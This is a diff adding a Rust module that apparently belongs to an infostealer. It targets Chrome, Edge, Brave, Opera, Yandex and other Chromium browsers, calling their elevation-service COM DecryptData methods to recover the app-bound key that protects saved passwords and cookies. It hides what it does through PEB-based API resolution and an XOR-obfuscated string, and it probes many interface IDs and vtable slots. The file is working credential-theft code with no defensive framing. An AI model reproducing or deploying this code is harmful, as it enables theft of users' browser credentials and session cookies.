@@ -1,0 +1,522 @@
+
+#![allow(non_snake_case, non_camel_case_types, dead_code, unused)]
+
+use std::ffi::c_void;
+use crate::xor::decode as obf_decode;
+
+const CHROME_RECOVERY_CLSID: &str = "19120815171f05081f19150c1f080305191609131e";
+
+#[repr(C)]
+#[derive(Clone, Copy, Debug)]
+pub struct GUID {
+    pub data1: u32,
+    pub data2: u16,
+    pub data3: u16,
+    pub data4: [u8; 8],
+}
+
+pub const fn guid(d1: u32, d2: u16, d3: u16, d4: [u8; 8]) -> GUID {
+    GUID { data1: d1, data2: d2, data3: d3, data4: d4 }
+}
+
+const IID_ELEVATOR: GUID            = guid(0xA949CB4E, 0xC4F9, 0x44C4, [0xB2, 0x13, 0x6B, 0xF8, 0xAA, 0x9A, 0xC6, 0x9C]);
+
+const IID_ELEVATOR_CHROME: GUID     = guid(0x463ABECF, 0x410D, 0x407F, [0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8]);
+const IID_ELEVATOR2_CHROME: GUID    = guid(0x1BF5208B, 0x295F, 0x4992, [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38]);
+
+const IID_ELEVATOR_CHROME_BETA: GUID  = guid(0xA2721D66, 0x376E, 0x4D2F, [0x9F, 0x0F, 0x90, 0x70, 0xE9, 0xA4, 0x2B, 0x5F]);
+const IID_ELEVATOR2_CHROME_BETA: GUID = guid(0xB96A14B8, 0xD0B0, 0x44D8, [0xBA, 0x68, 0x23, 0x85, 0xB2, 0xA0, 0x32, 0x54]);
+
+const IID_ELEVATOR_CHROME_DEV: GUID  = guid(0xBB2AA26B, 0x343A, 0x4072, [0x8B, 0x6F, 0x80, 0x55, 0x7B, 0x8C, 0xE5, 0x71]);
+const IID_ELEVATOR2_CHROME_DEV: GUID = guid(0x3FEFA48E, 0xC8BF, 0x461F, [0xAE, 0xD6, 0x63, 0xF6, 0x58, 0xCC, 0x85, 0x0A]);
+
+const IID_ELEVATOR_CHROME_CANARY: GUID  = guid(0x4F7CE041, 0x28E9, 0x484F, [0x9D, 0xD0, 0x61, 0xA8, 0xCA, 0xCE, 0xFE, 0xE4]);
+const IID_ELEVATOR2_CHROME_CANARY: GUID = guid(0xFF672E9F, 0x0994, 0x4322, [0x81, 0xE5, 0x3A, 0x5A, 0x97, 0x46, 0x14, 0x0A]);
+
+const IID_ELEVATOR_BRAVE: GUID      = guid(0xF396861E, 0x0C8E, 0x4C71, [0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0x9E]);
+
+const IID_ELEVATOR_EDGE: GUID       = guid(0xC9C2B807, 0x7731, 0x4F34, [0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B]);
+const IID_ELEVATOR2_EDGE: GUID      = guid(0x8F7B6792, 0x784D, 0x4047, [0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05]);
+
+const CLSID_CHROME: GUID            = guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]);
+const CLSID_CHROME_BETA: GUID       = guid(0xDD2646BA, 0x3707, 0x4BF8, [0xB9, 0xA7, 0x03, 0x86, 0x91, 0xA6, 0x8F, 0xC2]);
+const CLSID_CHROME_DEV: GUID        = guid(0xDA7FDCA5, 0x2CAA, 0x4637, [0xAA, 0x17, 0x07, 0x40, 0x58, 0x4D, 0xE7, 0xDA]);
+const CLSID_CHROME_CANARY: GUID     = guid(0x704C2872, 0x2049, 0x435E, [0xA4, 0x69, 0x0A, 0x53, 0x43, 0x13, 0xC4, 0x2B]);
+const CLSID_BRAVE: GUID             = guid(0x576B31AF, 0x6369, 0x4B6B, [0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B]);
+const CLSID_EDGE: GUID              = guid(0x1FCBE96C, 0x1697, 0x43AF, [0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67]);
+const CLSID_CHROMIUM: GUID          = guid(0x708860E0, 0xF641, 0x4611, [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B]);
+
+pub struct BrowserCom {
+    pub name: &'static str,
+    pub clsid: GUID,
+    pub iid: GUID,
+    pub iid_v2: Option<GUID>,
+    pub user_data_rel: &'static str,
+    pub service_name: &'static str,
+    pub is_edge: bool,
+}
+
+pub static BROWSERS: &[BrowserCom] = &[
+    BrowserCom {
+        name: "Chrome",
+        clsid: CLSID_CHROME,
+        iid: IID_ELEVATOR_CHROME,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"Google\Chrome\User Data",
+        service_name: "GoogleChromeElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Chrome Beta",
+        clsid: CLSID_CHROME_BETA,
+        iid: IID_ELEVATOR_CHROME_BETA,
+        iid_v2: Some(IID_ELEVATOR2_CHROME_BETA),
+        user_data_rel: r"Google\Chrome Beta\User Data",
+        service_name: "GoogleChromeBetaElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Chrome Dev",
+        clsid: CLSID_CHROME_DEV,
+        iid: IID_ELEVATOR_CHROME_DEV,
+        iid_v2: Some(IID_ELEVATOR2_CHROME_DEV),
+        user_data_rel: r"Google\Chrome Dev\User Data",
+        service_name: "GoogleChromeDevElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Chrome Canary",
+        clsid: CLSID_CHROME_CANARY,
+        iid: IID_ELEVATOR_CHROME_CANARY,
+        iid_v2: Some(IID_ELEVATOR2_CHROME_CANARY),
+        user_data_rel: r"Google\Chrome SxS\User Data",
+        service_name: "GoogleChromeCanaryElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Brave",
+        clsid: CLSID_BRAVE,
+        iid: IID_ELEVATOR_BRAVE,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
+        service_name: "BraveElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Edge",
+        clsid: CLSID_EDGE,
+        iid: IID_ELEVATOR_EDGE,
+        iid_v2: Some(IID_ELEVATOR2_EDGE),
+        user_data_rel: r"Microsoft\Edge\User Data",
+        service_name: "MicrosoftEdgeElevationService",
+        is_edge: true,
+    },
+    BrowserCom {
+        name: "Chromium",
+        clsid: CLSID_CHROMIUM,
+        iid: IID_ELEVATOR,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"Chromium\User Data",
+        service_name: "ChromiumElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Vivaldi",
+        clsid: CLSID_CHROMIUM,
+        iid: IID_ELEVATOR,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"Vivaldi\User Data",
+        service_name: "VivaldiElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Opera",
+        clsid: CLSID_CHROMIUM,
+        iid: IID_ELEVATOR,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"Opera Software\Opera Stable",
+        service_name: "OperaElevationService",
+        is_edge: false,
+    },
+    BrowserCom {
+        name: "Yandex",
+        clsid: CLSID_CHROMIUM,
+        iid: IID_ELEVATOR,
+        iid_v2: Some(IID_ELEVATOR2_CHROME),
+        user_data_rel: r"Yandex\YandexBrowser\User Data",
+        service_name: "YandexBrowserElevationService",
+        is_edge: false,
+    },
+];
+
+pub fn all_browsers() -> &'static [BrowserCom] {
+    BROWSERS
+}
+
+pub fn resolve_browser(exe_path: &str) -> Option<&'static BrowserCom> {
+    let exe = exe_path.to_lowercase();
+    let fname = std::path::Path::new(&exe)
+        .file_name()
+        .and_then(|f| f.to_str())
+        .map(|s| s.to_lowercase())
+        .unwrap_or_default();
+
+    if fname == "msedge.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Edge");
+    }
+    if fname == "brave.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Brave");
+    }
+    if fname == "chrome.exe" {
+        if exe.contains("chrome sxs") || exe.contains("\\sxs\\") {
+            return BROWSERS.iter().find(|b| b.name == "Chrome Canary");
+        }
+        if exe.contains("chrome dev") {
+            return BROWSERS.iter().find(|b| b.name == "Chrome Dev");
+        }
+        if exe.contains("chrome beta") {
+            return BROWSERS.iter().find(|b| b.name == "Chrome Beta");
+        }
+        if exe.contains("chromium") && !exe.contains("google") {
+            return BROWSERS.iter().find(|b| b.name == "Chromium");
+        }
+        return BROWSERS.iter().find(|b| b.name == "Chrome");
+    }
+    if fname == "vivaldi.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Vivaldi");
+    }
+    if fname == "opera.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Opera");
+    }
+    if fname == "browser.exe" {
+        if exe.contains("yandex") {
+            return BROWSERS.iter().find(|b| b.name == "Yandex");
+        }
+        if exe.contains("coccoc") {
+            return BROWSERS.iter().find(|b| b.name == "Chromium");
+        }
+        return BROWSERS.iter().find(|b| b.name == "Chromium");
+    }
+    if fname == "arc.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Chromium");
+    }
+    if fname == "epic.exe" || fname == "centbrowser.exe" || fname == "iridium.exe"
+        || fname == "thorium.exe" || fname == "slimjet.exe" || fname == "torch.exe" {
+        return BROWSERS.iter().find(|b| b.name == "Chromium");
+    }
+    None
+}
+
+fn parse_guid(s: &str) -> Option<GUID> {
+    let s = s.trim().trim_start_matches('{').trim_end_matches('}');
+    let parts: Vec<&str> = s.split('-').collect();
+    if parts.len() != 5 { return None; }
+    let d1 = u32::from_str_radix(parts[0], 16).ok()?;
+    let d2 = u16::from_str_radix(parts[1], 16).ok()?;
+    let d3 = u16::from_str_radix(parts[2], 16).ok()?;
+    let mut d4 = [0u8; 8];
+    let p3 = parts[3].as_bytes();
+    let p4 = parts[4].as_bytes();
+    if p3.len() != 4 || p4.len() != 12 { return None; }
+    d4[0] = u8::from_str_radix(std::str::from_utf8(&p3[0..2]).ok()?, 16).ok()?;
+    d4[1] = u8::from_str_radix(std::str::from_utf8(&p3[2..4]).ok()?, 16).ok()?;
+    for i in 0..6 {
+        d4[2+i] = u8::from_str_radix(std::str::from_utf8(&p4[2*i..2*i+2]).ok()?, 16).ok()?;
+    }
+    Some(GUID { data1: d1, data2: d2, data3: d3, data4: d4 })
+}
+
+fn guid_to_string(g: &GUID) -> String {
+    format!(
+        "{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
+        g.data1, g.data2, g.data3,
+        g.data4[0], g.data4[1], g.data4[2], g.data4[3],
+        g.data4[4], g.data4[5], g.data4[6], g.data4[7],
+    )
+}
+
+type FnCoInitializeEx = unsafe extern "system" fn(*const c_void, u32) -> i32;
+type FnCoUninitialize = unsafe extern "system" fn();
+type FnCoCreateInstance = unsafe extern "system" fn(*const GUID, *const c_void, u32, *const GUID, *mut *mut c_void) -> i32;
+type FnCoSetProxyBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
+type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
+type FnSysFreeString = unsafe extern "system" fn(*mut u16);
+type FnSysStringByteLen = unsafe extern "system" fn(*const u16) -> u32;
+
+struct ComApis {
+    co_init: FnCoInitializeEx,
+    co_uninit: FnCoUninitialize,
+    co_create: FnCoCreateInstance,
+    co_proxy: FnCoSetProxyBlanket,
+    sys_alloc: FnSysAllocStringByteLen,
+    sys_free: FnSysFreeString,
+    sys_len: FnSysStringByteLen,
+}
+
+static mut COM_APIS: Option<ComApis> = None;
+
+type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> *mut u8;
+
+unsafe fn force_load(name: &str) -> Option<*mut u8> {
+    if let Some(base) = crate::peb::get_module_base(name) {
+        return Some(base);
+    }
+    let k32 = if !crate::G_K32_BASE.is_null() {
+        crate::G_K32_BASE
+    } else {
+        crate::peb::get_module_base("kernel32.dll")?
+    };
+    let load_library: FnLoadLibraryA = std::mem::transmute(
+        crate::peb::resolve_export(k32, "LoadLibraryA")?
+    );
+    let c_name = std::ffi::CString::new(name).ok()?;
+    let base = load_library(c_name.as_ptr());
+    if base.is_null() { None } else { Some(base) }
+}
+
+unsafe fn init_com_apis() -> Option<&'static ComApis> {
+    if COM_APIS.is_some() { return COM_APIS.as_ref(); }
+
+    let k32 = if !crate::G_K32_BASE.is_null() {
+        crate::G_K32_BASE
+    } else {
+        crate::peb::get_module_base("kernel32.dll")?
+    };
+    let load_library_fn: FnLoadLibraryA = std::mem::transmute(crate::peb::resolve_export(k32, "LoadLibraryA")?);
+    let get_proc: unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8 = std::mem::transmute(
+        crate::peb::resolve_export(k32, "GetProcAddress")?
+    );
+
+    let ole32_name = std::ffi::CString::new("ole32.dll").ok()?;
+    let ole32 = load_library_fn(ole32_name.as_ptr());
+    if ole32.is_null() { return None; }
+    let oleaut_name = std::ffi::CString::new("oleaut32.dll").ok()?;
+    let oleaut = load_library_fn(oleaut_name.as_ptr());
+    if oleaut.is_null() { return None; }
+
+    let ci_name = std::ffi::CString::new("CoInitializeEx").ok()?;
+    let cu_name = std::ffi::CString::new("CoUninitialize").ok()?;
+    let cc_name = std::ffi::CString::new("CoCreateInstance").ok()?;
+    let cp_name = std::ffi::CString::new("CoSetProxyBlanket").ok()?;
+    let sa_name = std::ffi::CString::new("SysAllocStringByteLen").ok()?;
+    let sf_name = std::ffi::CString::new("SysFreeString").ok()?;
+    let sl_name = std::ffi::CString::new("SysStringByteLen").ok()?;
+
+    let ci = get_proc(ole32, ci_name.as_ptr());
+    let cu = get_proc(ole32, cu_name.as_ptr());
+    let cc = get_proc(ole32, cc_name.as_ptr());
+    let cp = get_proc(ole32, cp_name.as_ptr());
+    let sa = get_proc(oleaut, sa_name.as_ptr());
+    let sf = get_proc(oleaut, sf_name.as_ptr());
+    let sl = get_proc(oleaut, sl_name.as_ptr());
+
+    if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
+        return None;
+    }
+
+    COM_APIS = Some(ComApis {
+        co_init: std::mem::transmute(ci),
+        co_uninit: std::mem::transmute(cu),
+        co_create: std::mem::transmute(cc),
+        co_proxy: std::mem::transmute(cp),
+        sys_alloc: std::mem::transmute(sa),
+        sys_free: std::mem::transmute(sf),
+        sys_len: std::mem::transmute(sl),
+    });
+    COM_APIS.as_ref()
+}
+
+type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;
+
+const COINIT_MULTITHREADED: u32 = 0x0;
+const CLSCTX_LOCAL_SERVER: u32 = 0x4;
+const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
+const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;
+const RPC_C_AUTHN_LEVEL_PKT_PRIVACY: u32 = 6;
+const RPC_C_IMP_LEVEL_IMPERSONATE: u32 = 3;
+const EOAC_DYNAMIC_CLOAKING: u32 = 0x40;
+
+struct OwnedBstr(*mut u16);
+
+impl OwnedBstr {
+    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
+        if data.is_empty() { return None; }
+        let api = init_com_apis()?;
+        let p = (api.sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
+        if p.is_null() { None } else { Some(OwnedBstr(p)) }
+    }
+    fn ptr(&self) -> *mut u16 { self.0 }
+}
+
+impl Drop for OwnedBstr {
+    fn drop(&mut self) {
+        if !self.0.is_null() {
+            unsafe {
+                if let Some(api) = init_com_apis() {
+                    (api.sys_free)(self.0);
+                }
+            };
+            self.0 = std::ptr::null_mut();
+        }
+    }
+}
+
+unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
+    if p.is_null() { return Vec::new(); }
+    let api = match init_com_apis() {
+        Some(a) => a,
+        None => return Vec::new(),
+    };
+    let len = (api.sys_len)(p) as usize;
+    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
+    (api.sys_free)(p);
+    bytes
+}
+
+#[inline(never)]
+unsafe fn call_decrypt_at_slot(punk: *mut c_void, enc: &[u8], slot: usize) -> Result<Vec<u8>, String> {
+    if punk.is_null() { return Err("null punk".into()); }
+    let vtbl_ptr = *(punk as *const *const c_void);
+    if vtbl_ptr.is_null() { return Err("null vtbl".into()); }
+    let dec_fn_ptr = *(vtbl_ptr as *const *const c_void).add(slot);
+    if dec_fn_ptr.is_null() { return Err(format!("null DecryptData at slot {slot}")); }
+    let dec: FnDec = std::mem::transmute(dec_fn_ptr);
+
+    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
+    let mut plain: *mut u16 = std::ptr::null_mut();
+    let mut last_err: u32 = 0;
+    let hr_d = dec(punk, cipher.ptr(), &mut plain, &mut last_err);
+    if hr_d < 0 {
+        return Err(format!("DecryptData slot {slot} 0x{hr_d:08X} last_error={last_err}"));
+    }
+    let bytes = consume_bstr(plain);
+    if bytes.is_empty() { return Err(format!("empty key at slot {slot}")); }
+    Ok(bytes)
+}
+
+fn normalize_com_key(bytes: &[u8]) -> Option<Vec<u8>> {
+    if bytes.len() == 32 { return Some(bytes.to_vec()); }
+    if bytes.len() > 32 {
+        let tail = &bytes[bytes.len() - 32..];
+        if tail.iter().any(|&b| b != 0) { return Some(tail.to_vec()); }
+    }
+    None
+}
+
+unsafe fn try_one(clsid: &GUID, iid: &GUID, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
+    crate::step(110, "try_one: init_com_apis");
+    let api = init_com_apis().ok_or("COM APIs not initialized")?;
+    let mut punk: *mut c_void = std::ptr::null_mut();
+    crate::step(111, &format!("try_one: CoCreateInstance CLSCTX_LOCAL_SERVER"));
+    let hr = (api.co_create)(clsid, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid, &mut punk);
+    crate::step(112, &format!("try_one: CoCreateInstance hr=0x{:08X}", hr as u32));
+    if hr < 0 { return Err(format!("CoCreateInstance 0x{hr:08X}")); }
+    if punk.is_null() { return Err("null COM pointer".into()); }
+
+    let _ = (api.co_proxy)(
+        punk,
+        RPC_C_AUTHN_DEFAULT,
+        RPC_C_AUTHZ_DEFAULT,
+        std::ptr::null(),
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        RPC_C_IMP_LEVEL_IMPERSONATE,
+        std::ptr::null(),
+        EOAC_DYNAMIC_CLOAKING,
+    );
+
+    let mut last = String::from("no slot worked");
+    for &slot in slots {
+        crate::step(113, &format!("try_one: DecryptData slot {slot}"));
+        match call_decrypt_at_slot(punk, enc, slot) {
+            Ok(bytes) => {
+                if let Some(key) = normalize_com_key(&bytes) {
+                    let vtbl_ptr = *(punk as *const *const c_void);
+                    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*(vtbl_ptr as *const *const c_void).add(2));
+                    rel(punk);
+                    return Ok(key);
+                }
+                last = format!("slot {slot}: unexpected length {}", bytes.len());
+            }
+            Err(e) => last = e,
+        }
+    }
+
+    let vtbl_ptr = *(punk as *const *const c_void);
+    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(*(vtbl_ptr as *const *const c_void).add(2));
+    rel(punk);
+    Err(format!("DecryptData failed; last: {last}"))
+}
+
+unsafe fn try_browser(browser: &BrowserCom, enc: &[u8]) -> Result<Vec<u8>, String> {
+    let clsid = if let Ok(s) = std::env::var(&obf_decode(CHROME_RECOVERY_CLSID)) {
+        if let Some(g) = parse_guid(&s) { g } else { browser.clsid }
+    } else {
+        browser.clsid
+    };
+
+    let slots: &[usize] = if browser.is_edge {
+        &[8usize, 6, 7, 5]
+    } else {
+        &[5usize, 6, 7, 8]
+    };
+
+    let iids: &[GUID] = if let Some(v2) = browser.iid_v2 {
+        &[v2, browser.iid][..]
+    } else {
+        std::slice::from_ref(&browser.iid)
+    };
+
+    let mut last = String::new();
+    for iid in iids {
+        let iid_str = guid_to_string(iid);
+        crate::step(120, &format!("try_browser: trying IID {}", iid_str));
+        match try_one(&clsid, iid, enc, slots) {
+            Ok(key) => {
+                return Ok(key);
+            }
+            Err(e) => {
+                last = e;
+            }
+        }
+    }
+
+    Err(format!("{} failed; last: {last}", browser.name))
+}
+
+pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+    unsafe {
+        crate::step(100, "decrypt_for_browser: init COM apis");
+        let api = init_com_apis().ok_or("COM APIs not init")?;
+        crate::step(101, "decrypt_for_browser: CoInitializeEx");
+        let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
+        let hr_u = hr as u32;
+        if hr < 0 && hr_u != 0x0000_0001u32 {
+            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+        }
+        crate::step(102, &format!("decrypt_for_browser: trying {}", browser.name));
+        let r = try_browser(browser, encrypted_key);
+        crate::step(103, &format!("decrypt_for_browser: result ok={}", r.is_ok()));
+        (api.co_uninit)();
+        r
+    }
+}
+
+pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
+    unsafe {
+        let api = init_com_apis().ok_or("COM APIs not init")?;
+        let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
+        let hr_u = hr as u32;
+        if hr < 0 && hr_u != 0x0000_0001u32 {
+            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
+        }
+        let mut last = String::from("no browser tried");
+        for b in BROWSERS {
+            match try_browser(b, encrypted_key) {
+                Ok(key) => { (api.co_uninit)(); return Ok(key); }
+                Err(e) => last = format!("{}: {e}", b.name),
+            }
+        }
+        (api.co_uninit)();
+        Err(format!("all browsers failed; last: {last}"))
+    }
+}
